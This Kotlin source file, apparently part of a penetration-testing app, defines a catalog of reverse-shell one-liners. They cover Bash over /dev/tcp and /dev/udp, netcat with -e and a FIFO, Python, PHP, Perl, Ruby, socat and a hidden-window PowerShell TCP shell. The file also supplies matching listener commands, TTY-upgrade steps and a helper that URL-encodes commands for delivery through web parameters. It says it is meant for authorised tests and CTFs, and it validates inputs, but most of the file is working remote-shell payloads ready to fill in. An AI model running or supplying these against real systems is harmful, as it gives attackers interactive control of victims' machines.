package com.fearmikey.rf_reapr.domain.service

import java.net.URLEncoder

enum class ShellPlatform(val label: String) {
    UNIX("Linux / macOS"),
    WINDOWS("Windows")
}

/** [template] uses `{ip}`, `{port}` and `{shell}` placeholders. */
data class ShellTemplate(
    val name: String,
    val platform: ShellPlatform,
    val template: String,
    /** What has to exist on the target for the one-liner to work. */
    val requires: String
)

data class ListenerTemplate(val name: String, val template: String, val note: String)

/**
 * Reference reverse-shell one-liners for authorised penetration tests and CTFs: the standard
 * forms from public cheat sheets, rendered with the tester's listener address. Inputs are
 * validated so a typo can't silently produce a command that connects somewhere else.
 */
object ReverseShellCatalog {

    val shells = listOf("/bin/sh", "/bin/bash", "/bin/zsh")

    val templates = listOf(
        ShellTemplate("Bash (TCP)", ShellPlatform.UNIX, "bash -i >& /dev/tcp/{ip}/{port} 0>&1", "bash built with /dev/tcp support"),
        ShellTemplate("Bash (UDP)", ShellPlatform.UNIX, "sh -i >& /dev/udp/{ip}/{port} 0>&1", "bash as sh; listen with nc -u"),
        ShellTemplate("Netcat (-e)", ShellPlatform.UNIX, "nc -e {shell} {ip} {port}", "traditional netcat or ncat with -e"),
        ShellTemplate(
            "Netcat (OpenBSD, FIFO)", ShellPlatform.UNIX,
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f", "any netcat, mkfifo"
        ),
        ShellTemplate(
            "Python 3", ShellPlatform.UNIX,
            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));" +
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"{shell}\",\"-i\"])'",
            "python3"
        ),
        ShellTemplate(
            "PHP", ShellPlatform.UNIX,
            "php -r '\$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} -i <&3 >&3 2>&3\");'", "php CLI with exec enabled"
        ),
        ShellTemplate(
            "Perl", ShellPlatform.UNIX,
            "perl -e 'use Socket;\$i=\"{ip}\";\$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" +
                "if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
            "perl"
        ),
        ShellTemplate(
            "Ruby", ShellPlatform.UNIX,
            "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'", "ruby"
        ),
        ShellTemplate(
            "Socat (full TTY)", ShellPlatform.UNIX,
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}", "socat on the target; use the socat listener"
        ),
        ShellTemplate(
            "PowerShell", ShellPlatform.WINDOWS,
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});" +
                "\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};" +
                "while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;" +
                "\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);" +
                "\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';" +
                "\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};" +
                "\$client.Close()\"",
            "Windows PowerShell"
        ),
        ShellTemplate("Netcat (Windows)", ShellPlatform.WINDOWS, "nc.exe -e cmd.exe {ip} {port}", "nc.exe present on the target")
    )

    val listeners = listOf(
        ListenerTemplate("Netcat", "nc -lvnp {port}", "Works with every TCP payload above."),
        ListenerTemplate("Netcat (UDP)", "nc -u -lvnp {port}", "For the Bash UDP payload."),
        ListenerTemplate("Socat (full TTY)", "socat file:`tty`,raw,echo=0 tcp-listen:{port}", "Pairs with the socat payload; gives job control and tab completion."),
        ListenerTemplate("rlwrap + Netcat", "rlwrap nc -lvnp {port}", "Adds line editing and history, handy for Windows shells.")
    )

    /** Run after catching a basic shell to get a usable terminal. */
    val ttyUpgrade = listOf(
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "export TERM=xterm",
        "Ctrl+Z, then on your machine: stty raw -echo; fg"
    )

    private val hostPattern = Regex("^[A-Za-z0-9]([A-Za-z0-9.-]{0,251}[A-Za-z0-9])?$")

    /** Null when [host] is a usable IPv4 address or hostname; otherwise the reason it was rejected. */
    fun hostError(host: String): String? {
        val value = host.trim()
        return when {
            value.isEmpty() -> "Enter the address your listener is reachable on."
            // Quotes, spaces and shell metacharacters would break or change the generated commands.
            !hostPattern.matches(value) -> "Use an IPv4 address or hostname (letters, digits, dots and hyphens only)."
            value.all { it.isDigit() || it == '.' } && SubnetCalculator.parseIpv4(value) == null -> "Not a valid IPv4 address."
            else -> null
        }
    }

    fun parsePort(text: String): Int? = text.trim().toIntOrNull()?.takeIf { it in 1..65535 }

    fun portNote(port: Int): String? = when {
        port < 1024 -> "Ports below 1024 need root on the listener."
        else -> null
    }

    fun render(template: String, host: String, port: Int, shell: String = shells.first()): String =
        template.replace("{ip}", host.trim()).replace("{port}", port.toString())
            .replace("{shell}", shell.takeIf { it in shells } ?: shells.first())

    /** Percent-encoded form for delivering a command through a URL or form parameter. */
    fun urlEncoded(command: String): String = URLEncoder.encode(command, "UTF-8").replace("+", "%20")

    fun filter(platform: ShellPlatform?, text: String): List<ShellTemplate> {
        val needle = text.trim()
        return templates.filter { t ->
            (platform == null || t.platform == platform) &&
                (needle.isEmpty() || t.name.contains(needle, true) || t.requires.contains(needle, true))
        }
    }
}
